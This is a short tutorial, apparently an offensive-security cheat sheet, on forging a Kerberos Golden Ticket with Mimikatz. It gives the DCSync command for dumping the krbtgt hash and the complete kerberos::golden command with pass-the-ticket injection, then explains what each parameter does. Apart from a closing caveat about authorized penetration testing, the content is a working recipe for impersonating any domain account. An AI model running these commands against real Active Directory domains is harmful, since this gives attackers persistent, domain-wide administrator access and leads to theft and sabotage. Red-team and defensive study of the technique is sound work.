Generating and Injecting Golden Tickets with Mimikatz

Practical steps to forge and use a master Kerberos TGT

# Step 1: Obtain krbtgt hash (requires DA privileges)
# lsadump::dcsync /domain:<DOMAIN.LOCAL> /user:krbtgt

# Step 2: Generate a Golden Ticket with mimikatz
kerberos::golden /user:Administrator /domain:<DOMAIN.LOCAL> /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_HASH> /id:500 /ptt
Key Takeaway

The /ptt (Pass The Ticket) option is crucial as it injects the forged TGT directly into the current session, enabling immediate impersonation without a password.

Command Breakdown

  • /user:Administrator: The account to impersonate.
  • /domain:<DOMAIN.LOCAL>: The target Active Directory domain.
  • /sid:<DOMAIN_SID>: The Security Identifier of the domain.
  • /krbtgt:<KRBTGT_HASH>: The NTLM hash of the krbtgt account.
  • /id:500: Sets the Relative Identifier (RID) to 500, typically for the built-in Administrator.
  • /ptt: Pass The Ticket, injects the forged TGT into the current session.

Security Implications

Golden Tickets are extremely powerful. Their creation and use should be strictly limited to authorized penetration testing environments. Compromise of the krbtgt hash is a critical security incident.
